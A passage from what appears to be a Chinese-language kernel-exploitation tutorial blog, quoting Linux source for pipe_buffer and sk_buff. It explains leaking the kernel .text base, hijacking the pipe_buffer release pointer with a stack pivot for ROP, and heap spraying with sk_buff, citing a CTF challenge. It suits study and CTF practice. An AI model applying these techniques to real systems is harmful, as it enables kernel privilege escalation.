ops.</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="分配：pipe-系统调用族"><a href="#分配：pipe-系统调用族" class="headerlink" title="分配：pipe 系统调用族"></a>分配：pipe 系统调用族</h3><p>创建管道使用的自然是 pipe 与 pipe2 这两个系统调用，其最终都会调用到 <code>do_pipe2()</code> 这个函数，不同的是后者我们可以指定一个 flag，而前者默认 flag 为 0</p><p>存在如下调用链：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">do_pipe2</span>()</span><br><span class="hljs-function"><span class="hljs-title">__do_pipe_flags</span>()</span><br><span class="hljs-function"><span class="hljs-title">create_pipe_files</span>()</span><br><span class="hljs-function"><span class="hljs-title">get_pipe_inode</span>()</span><br><span class="hljs-function"><span class="hljs-title">alloc_pipe_info</span>()</span><br></code></pre></td></tr></table></figure><p>最终调用 <code>kcalloc()</code> 分配一个 <code>pipe_buffer</code> 数组，默认数量为 <code>PIPE_DEF_BUFFERS</code> （16）个，因此会直接从 kmalloc-1k 中拿 object：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> pipe_inode_info *<span class="hljs-title function_">alloc_pipe_info</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> pipe_bufs = PIPE_DEF_BUFFERS;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_struct</span> *<span class="hljs-title">user</span> =</span> get_current_user();<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> user_bufs;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> max_size = READ_ONCE(pipe_max_size);<br><br>pipe = kzalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_inode_info), GFP_KERNEL_ACCOUNT);<br><br>    <span class="hljs-comment">//...</span><br><br>pipe-&gt;bufs = kcalloc(pipe_bufs, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer),<br>     GFP_KERNEL_ACCOUNT);<br></code></pre></td></tr></table></figure><h3 id="释放：close-系统调用"><a href="#释放：close-系统调用" class="headerlink" title="释放：close 系统调用"></a>释放：close 系统调用</h3><p>当我们关闭一个管道的两端之后，对应的管道就会被释放掉，相应地，<code>pipe_buffer</code> 数组也会被释放掉</p><p>对于管道对应的文件，其 <code>file_operations</code> 被设为 <code>pipefifo_fops</code> ，其中 release 函数指针设为 <code>pipe_release</code> 函数，因此在关闭管道文件时有如下调用链：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">pipe_release</span>()</span><br>    <span class="hljs-function"><span class="hljs-title">put_pipe_info</span>()</span><br></code></pre></td></tr></table></figure><p>在 <code>put_pipe_info()</code> 中会将管道对应的文件计数减一，管道两端都关闭之后最终会走到 <code>free_pipe_info()</code> 中，在该函数中释放掉管道本体与 buffer 数组</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">free_pipe_info</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pipe_inode_info *pipe)</span><br>&#123;<br><span class="hljs-type">int</span> i;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br><span class="hljs-keyword">if</span> (pipe-&gt;watch_queue) &#123;<br>watch_queue_clear(pipe-&gt;watch_queue);<br>put_watch_queue(pipe-&gt;watch_queue);<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>(<span class="hljs-type">void</span>) account_pipe_buffers(pipe-&gt;user, pipe-&gt;nr_accounted, <span class="hljs-number">0</span>);<br>free_uid(pipe-&gt;user);<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; pipe-&gt;ring_size; i++) &#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span> =</span> pipe-&gt;bufs + i;<br><span class="hljs-keyword">if</span> (buf-&gt;ops)<br>pipe_buf_release(pipe, buf);<br>&#125;<br><span class="hljs-keyword">if</span> (pipe-&gt;tmp_page)<br>__free_page(pipe-&gt;tmp_page);<br>kfree(pipe-&gt;bufs);<br>kfree(pipe);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="数据泄露-5"><a href="#数据泄露-5" class="headerlink" title="数据泄露"></a>数据泄露</h3><h4 id="内核-text-段地址-3"><a href="#内核-text-段地址-3" class="headerlink" title="内核 .text 段地址"></a>内核 .text 段地址</h4><p><code>pipe_buffer-&gt;pipe_buf_operations</code> 通常指向一张全局函数表，我们可以通过该函数表的地址泄露出内核 .text 段基址</p><h3 id="劫持内核执行流-2"><a href="#劫持内核执行流-2" class="headerlink" title="劫持内核执行流"></a>劫持内核执行流</h3><p>当我们关闭了管道的两端时，会触发 <code>pipe_buffer-&gt;pipe_buffer_operations-&gt;release</code> 这一指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> &#123;</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * -&gt;confirm() verifies that the data in the pipe buffer is there</span><br><span class="hljs-comment"> * and that the contents are good. If the pages in the pipe belong</span><br><span class="hljs-comment"> * to a file system, we may need to wait for IO completion in this</span><br><span class="hljs-comment"> * hook. Returns 0 for good, or a negative error value in case of</span><br><span class="hljs-comment"> * error.  If not present all pages are considered good.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> (*confirm)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * When the contents of this pipe buffer has been completely</span><br><span class="hljs-comment"> * consumed by a reader, -&gt;release() is called.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> (*release)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Attempt to take ownership of the pipe buffer and its contents.</span><br><span class="hljs-comment"> * -&gt;try_steal() returns %true for success, in which case the contents</span><br><span class="hljs-comment"> * of the pipe (the buf-&gt;page) is locked and now completely owned by the</span><br><span class="hljs-comment"> * caller. The page may then be transferred to a different mapping, the</span><br><span class="hljs-comment"> * most often used case is insertion into different file address space</span><br><span class="hljs-comment"> * cache.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">bool</span> (*try_steal)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Get a reference to the pipe buffer.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">bool</span> (*get)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br>&#125;;<br></code></pre></td></tr></table></figure><p>存在如下调用链：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">pipe_release</span>()<br>    <span class="hljs-built_in">put_pipe_info</span>()<br>        <span class="hljs-built_in">free_pipe_info</span>()<br>            <span class="hljs-built_in">pipe_buf_release</span>()<br>                pipe_buffer-&gt;pipe_buf_operations-&gt;<span class="hljs-built_in">release</span>() <span class="hljs-comment">// it should be anon_pipe_buf_release()</span><br></code></pre></td></tr></table></figure><p>在 <code>pipe_buf_release()</code> 中会调用到该 <code>pipe_buffer</code> 的函数表中的 release 指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * pipe_buf_release - put a reference to a pipe_buffer</span><br><span class="hljs-comment"> * @pipe:the pipe that the buffer belongs to</span><br><span class="hljs-comment"> * @buf:the buffer to put a reference to</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">pipe_buf_release</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pipe_inode_info *pipe,</span><br><span class="hljs-params">    <span class="hljs-keyword">struct</span> pipe_buffer *buf)</span><br>&#123;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span> =</span> buf-&gt;ops;<br><br>buf-&gt;ops = <span class="hljs-literal">NULL</span>;<br>ops-&gt;release(pipe, buf);<br>&#125;<br></code></pre></td></tr></table></figure><p>因此我们只需要劫持其函数表到可控区域后再关闭管道的两端便能劫持内核执行流</p><p>经过笔者实测（其实从源码上便能看出），当执行到该指针时 rsi 寄存器刚好指向对应的 <code>pipe_buffer</code>，因此我们可以将函数表劫持到 <code>pipe_buffer</code> 上，找到一条合适的 gadget 将栈迁移到该处，从而更顺利地完成 ROP</p><p><img src="https://s2.loli.net/2022/02/25/daklBHtIYCs3K6q.png" alt="image.png"></p><p>（例题：<a href="https://arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP/">D^3CTF2022 - d3kheap</a>）</p><blockquote><p>之前例题本来想选一个以前有的 CTF 题来写的，但是<strong>笔者太懒了</strong>…于是一直拖到最近刚好拿这个结构体出了一道 CTF 题，所以就顺便把这个过去开的坑给补充上…</p></blockquote><h1 id="0x09-sk-buff：内核中的“大对象菜单堆”"><a href="#0x09-sk-buff：内核中的“大对象菜单堆”" class="headerlink" title="0x09.sk_buff：内核中的“大对象菜单堆”"></a>0x09.sk_buff：内核中的“大对象菜单堆”</h1><p>说到 Linux kernel 的网络协议栈，我们毫无疑问无法绕开 <code>sk_buff</code> 这一基础结构体，但相比于他的常规功能，我们更加关注其在漏洞利用中给我们带来的便利</p><h2 id="sk-buff：size-gt-x3D-512-的对象分配"><a href="#sk-buff：size-gt-x3D-512-的对象分配" class="headerlink" title="sk_buff：size &gt;&#x3D; 512 的对象分配"></a>sk_buff：size &gt;&#x3D; 512 的对象分配</h2><p><code>sk_buff</code> 是 Linux kernel 网络协议栈中一个<strong>重要的基础结构体</strong>，其用以表示在网络协议栈中传输的一个「包」，但其结构体本身不包含一个包的数据部分，而是包含该包的各种属性，<strong>数据包的本体数据则使用一个单独的 object 储存</strong></p><p>这个结构体成员比较多，我们主要关注核心部分</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sk_buff</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-comment">/* These two members must be first. */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sk_buff</span>*<span class="hljs-title">next</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sk_buff</span>*<span class="hljs-title">prev</span>;</span><br><br><span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-comment">// ...</span><br><br><span class="hljs-comment">/* These elements must be at the end, see alloc_skb() for details.  */</span><br><span class="hljs-type">sk_buff_data_t</span>tail;<br><span class="hljs-type">sk_buff_data_t</span>end;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*head,<br>*data;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>truesize;<br><span class="hljs-type">refcount_t</span>users;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SKB_EXTENSIONS</span><br><span class="hljs-comment">/* only useable after checking -&gt;active_extensions != 0 */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">skb_ext</span>*<span class="hljs-title">extensions</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure><p><code>sk_buff</code> 结构体与其所表示的数据包形成如下结构，其中：</p><ul><li><code>head</code> ：一个数据包<strong>实际的起始处</strong>（也就是为该数据包分配的 object 的首地址）</li><li><code>end</code> ：一个数据包实际的末尾（为该数据包分配的 object 的末尾地址）</li><li><code>data</code> ：<strong>当前所在 layer 的数据包对应的起始地址</strong></li><li><code>tail</code> ：<strong>当前所在 layer 的数据包对应的末尾地址</strong></li></ul><p>data 和 tail 可以这么理解：数据包每经过网络层次模型中的一层都会被添加&#x2F;删除一个 header （有时还有一个 tail），data 与 tail 便是用以对此进行标识的</p><p><img src="https://s2.loli.net/2022/03/31/AV8HsnZj2bUCl4J.png" alt="image.png"></p><p>多个 <code>sk_buff</code> 之间形成双向链表结构，类似于 <code>msg_queue</code>，这里同样有一个 <code>sk_buff_head</code> 结构作为哨兵节点</p><p><img src="https://s2.loli.net/2022/04/11/U8CjYMBOcZ74s3W.png" alt="image.png"></p><h3 id="分配（数据包：-GFP-NOMEMALLOC-GFP-NOWARN）"><a href="#分配（数据包：-GFP-NOMEMALLOC-GFP-NOWARN）" class="headerlink" title="分配（数据包：__GFP_NOMEMALLOC | __GFP_NOWARN）"></a>分配（数据包：__GFP_NOMEMALLOC | __GFP_NOWARN）</h3><p>在内核网络协议栈中很多地方都会用到该结构体，例如 sendmsg 系统调用一类的操作都会造成包的创建，其最终都会调用到 <code>alloc_skb()</code> 来分配该结构体，而这个函数又是 <code>__alloc_skb()</code> 的 wrapper，不过需要注意的是其会从<strong>独立的</strong> <code>skbuff_fclone_cache </code> &#x2F; <code> skbuff_head_cache</code> 取 object</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sk_buff</span> *__<span class="hljs-title">alloc_skb</span>(<span class="hljs-title">unsigned</span> <span class="hljs-title">int</span> <span class="hljs-title">size</span>, <span class="hljs-title">gfp_t</span> <span class="hljs-title">gfp_mask</span>,</span><br><span class="hljs-class">    <span class="hljs-title">int</span> <span class="hljs-title">flags</span>, <span class="hljs-title">int</span> <span class="hljs-title">node</span>)</span><br><span class="hljs-class">&#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *<span class="hljs-title">cache</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sk_buff</span> *<span class="hljs-title">skb</span>;</span><br>u8 *data;<br><span class="hljs-type">bool</span> pfmemalloc;<br><br>cache = (flags &amp; SKB_ALLOC_FCLONE)<br>? skbuff_fclone_cache : skbuff_head_cache;<br><br><span class="hljs-keyword">if</span> (sk_memalloc_socks() &amp;&amp; (flags &amp; SKB_ALLOC_RX))<br>gfp_mask |= __GFP_MEMALLOC;<br><br><span class="hljs-comment">/* Get the HEAD */</span><br><span class="hljs-keyword">if</span> ((flags &amp; (SKB_ALLOC_FCLONE | SKB_ALLOC_NAPI)) == SKB_ALLOC_NAPI &amp;&amp;<br>    likely(node == NUMA_NO_NODE || node == numa_mem_id()))<br>skb = napi_skb_cache_get();<br><span class="hljs-keyword">else</span><br>skb = kmem_cache_alloc_node(cache, gfp_mask &amp; ~GFP_DMA, node);<br><span class="hljs-keyword">if</span> (unlikely(!skb))<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>prefetchw(skb);<br><br><span class="hljs-comment">/* We do our best to align skb_shared_info on a separate cache</span><br><span class="hljs-comment"> * line. It usually works because kmalloc(X &gt; SMP_CACHE_BYTES) gives</span><br><span class="hljs-comment"> * aligned memory blocks, unless SLUB/SLAB debug is enabled.</span><br><span class="hljs-comment"> * Both skb-&gt;head and skb_shared_info are cache line aligned.</span><br><span class="hljs-comment"> */</span><br>size = SKB_DATA_ALIGN(size);<br>size += SKB_DATA_ALIGN(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> skb_shared_info));<br>data = kmalloc_reserve(size, gfp_mask, node, &amp;pfmemalloc);<br><span class="hljs-keyword">if</span> (unlikely(!data))<br><span class="hljs-keyword">goto</span> nodata;<br><span class="hljs-comment">/* kmalloc(size) might give us more room than requested.</span><br><span class="hljs-comment"> * Put skb_shared_info exactly at the end of allocated zone,</span><br><span class="hljs-comment"> * to allow max possible filling before reallocation.</span><br><span class="hljs-comment"> */</span><br>size = SKB_WITH_OVERHEAD(ksize(data));<br>prefetchw(data + size);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Only clear those fields we need to clear, not those that we will</span><br><span class="hljs-comment"> * actually initialise below. Hence, don&#x27;t put any more fields after</span><br><span class="hljs-comment"> * the tail pointer in struct sk_buff!</span><br><span class="hljs-comment"> */</span><br><span class="hljs-built_in">memset</span>(skb, <span class="hljs-number">0</span>, offsetof(<span class="hljs-keyword">struct</span> sk_buff, tail));<br>__build_skb_around(skb, data, <span class="hljs-number">0</span>);<br>skb-&gt;pfmemalloc = pfmemalloc;<br><br><span class="hljs-keyword">if</span> (flags &amp; SKB_ALLOC_FCLONE) &#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sk_buff_fclones</span> *<span class="hljs-title">fclones</span>;</span><br><br>fclones = container_of(skb, <span class="hljs-keyword">struct</span> sk_buff_fclones, skb1);<br><br>skb-&gt;fclone = SKB_FCLONE_ORIG;<br>refcount_set(&amp;fclones-&gt;fclone_ref, <span class="hljs-number">1</span>);<br><br>fclones-&gt;skb2.fclone = SKB_FCLONE_CLONE;<br>&#125;<br><br><span class="hljs-keyword">return</span> skb;<br><br>nodata:<br>kmem_cache_free(cache, skb);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br>EXPORT_SYMBOL(__alloc_skb);<br></code></pre></td></tr></table></figure><p><code>sk_buff</code> 虽然是从独立的 kmem_cache 中分配的，<strong>但其对应的数据包不是</strong>，我们在这里注意到分配数据包时使用的是 <code>kmalloc_reserve()</code>，最终会调用到 <code>__kmalloc_node_track_caller()</code>，<strong>走常规的 kmalloc 分配路径</strong>，因此我们仍然可以实现近乎任意大小 object 的分配与释放</p><p>因此 <code>sk_buff</code> 与 <code>msg_msg</code> 一样常被用来完成堆喷的工作，不同的是 <code>msg_msg</code> 带了一个 header，而 <code>sk_buff</code> 的数据包则带一个 tail——<code>skb_shared_info</code> 结构体</p><p><img src="https://s2.loli.net/2022/04/11/YQJMeIwR8P9hC1t.png" alt="image.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">skb_shared_info</span> &#123;</span><br>__u8flags;<br>__u8meta_len;<br>__u8nr_frags;<br>__u8tx_flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">short</span>gso_size;<br><span class="hljs-comment">/* Warning: this field is not always filled in (UFO)! */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">short</span>gso_segs;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sk_buff</span>*<span class="hljs-title">frag_list</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">skb_shared_hwtstamps</span> <span class="hljs-title">hwtstamps</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>gso_type;<br>u32tskey;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Warning : all fields before dataref are cleared in __alloc_skb()</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">atomic_t</span>dataref;<br><br><span class="hljs-comment">/* Intermediate layers must ensure that destructor_arg</span><br><span class="hljs-comment"> * remains valid until skb destructor */</span><br><span class="hljs-type">void</span> *destructor_arg;<br><br><span class="hljs-comment">/* must be last field, see pskb_expand_head() */</span><br><span class="hljs-type">skb_frag_t</span>frags[MAX_SKB_FRAGS];<br>&#125;;<br></code></pre></td></tr></table></figure><p><code>skb_shared_info</code> 结构体的<strong>大小为 320 字节，这意味着我们能够利用分配的 object 最小的大小也得是 512 字节，这无疑为我们的利用增添了几分难度</strong>，但不可否认的是 <code>sk_buff</code> 仍为我们提供了较大对象的任意分配写入与释放</p><h3 id="释放"><a href="#释放" class="headerlink" title="释放"></a>释放</h3><p>正所谓有发必有收，我们只需要沿着发送的路径接收该包就能将其释放掉，例如若是我们通过向套接字中写入数据创建了一个包，则从套接字中读出该包便能将其释放</p><p>在内核中调用的是 <code>kfree_skb()</code> 函数进行释放，对于数据，其最终会调用到 <code>skb_release_data()</code> ，在这其中调用到 <code>skb_free_head()</code> 进行释放：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">skb_free_head</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sk_buff *skb)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *head = skb-&gt;head;<br><br><span class="hljs-keyword">if</span> (skb-&gt;head_frag) &#123;<br><span class="hljs-keyword">if</span> (skb_pp_recycle(skb, head))<br><span class="hljs-keyword">return</span>;<br>skb_free_frag(head);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>kfree(head);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>而 <code>sk_buff</code> 本身则通过 <code>kfree_skbmem()</code> 进行释放，主要就是直接放入对应的 kmem_cache 中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> *Free an skbuff by memory without cleaning the state.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">kfree_skbmem</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sk_buff *skb)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sk_buff_fclones</span> *<span class="hljs-title">fclones</span>;</span><br><br><span class="hljs-keyword">switch</span> (skb-&gt;fclone) &#123;<br><span class="hljs-keyword">case</span> SKB_FCLONE_UNAVAILABLE:<br>kmem_cache_free(skbuff_head_cache, skb);<br><span class="hljs-keyword">return</span>;<br><br><span class="hljs-keyword">case</span> SKB_FCLONE_ORIG:<br>fclones = container_of(skb, <span class="hljs-keyword">struct</span> sk_buff_fclones, skb1);<br><br><span class="hljs-comment">/* We usually free the clone (TX completion) before original skb</span><br><span class="hljs-comment"> * This test would have no chance to be true for the clone,</span><br><span class="hljs-comment"> * while here, branch prediction will be good.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (refcount_read(&amp;fclones-&gt;fclone_ref) == <span class="hljs-number">1</span>)<br><span class="hljs-keyword">goto</span> fastpath;<br><span class="hljs-keyword">break</span>;<br><br><span class="hljs-keyword">default</span>: <span class="hljs-comment">/* SKB_FCLONE_CLONE */</span><br>fclones = container_of(skb, <span class="hljs-keyword">struct</span> sk_buff_fclones, skb2);<br><span 